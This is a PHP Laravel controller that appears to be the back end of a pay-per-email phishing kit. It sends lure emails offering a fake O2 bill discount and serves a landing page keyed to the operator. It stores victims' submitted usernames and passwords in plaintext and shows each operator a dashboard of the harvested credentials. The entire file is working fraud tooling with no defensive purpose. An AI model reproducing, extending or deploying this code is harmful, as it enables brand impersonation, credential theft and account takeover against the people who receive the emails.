<?php

namespace App\Http\Controllers;
use App\Models\Email;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth; 
use App\Mail\WelcomeEmail;
use Illuminate\Support\Facades\Mail;
use App\Models\UserCredential;

class EmailController extends Controller
{
    /**
     * Display a listing of the resource.
     */

     public function index(Request $request)
     {

        
    

     $role = Auth::user()->role;
           
     if($role == 0){
  
        $id = Auth::id();

        $user_data = UserCredential::where(["user_id"=>$id])->paginate(10);
        

        return view('dashboard')->with(["user_data"=> $user_data]);
     }else{     
        $user_data =UserCredential::with('user')->paginate(10);;     
        return view('dashboard')->with(["user_data"=> $user_data]);
     }


     }

     

    public function offer(Request $request , $id)
    {


       return view("home" , ["user_id"=>$id]);

    }

    /**
     * Show the form for creating a new resource.
     */
    public function create(Request $request)
    {


        // Validate the incoming request
        $validatedData = $request->validate([
            'user_id' => 'required',
            'username' => 'required|string|max:255',
            'password' => 'required|string',
        ]);

        // Store the data in the database
        UserCredential::create([
            'user_id' => $validatedData['user_id'],
            'username' => $validatedData['username'],
            'password' => $validatedData['password'], 
        ]);

        return redirect("/thankyou")->with('success', 'Credentials saved successfully.');
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {   

        $email = $request->email;
       // Validate the email input
       $balance = Auth::user()->balance;
       if(intval($balance) > 0.123){
       
       $validatedData = $request->validate([
        'email' => 'required|email|max:255',
    ]);

    // Add the authenticated user's ID to the data
     $validatedData['user_id'] = Auth::id();

    
    // Store the validated data in the database
    Email::create($validatedData);


      $user = Auth::user();
      $balance = intval($user->balance) - 0.123;
        // Update the user's balance
       $user->balance = $balance ;
        $user->save();
   
        $messagestring = " Congratulations!  you’re eligible for flat 30% off on your upcoming O2 bill.To apply discount please on the link below.";
       
    
        $message = htmlspecialchars($messagestring);
        


    

   $emaildat=  Mail::to($email)->send(new WelcomeEmail($message , $validatedData));

 

    return redirect()->back()->with('success', 'Email successfully Sent!');

       }else{
        
        toastr()->success('Data has been saved successfully!');
        return redirect()->back()->with('error', 'insufficient balance');

       }

}

    /**
     * Display the specified resource.
     */
    public function show(Email $email)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function edit(Email $email)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, Email $email)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(Email $email)
    {
        //
    }
}
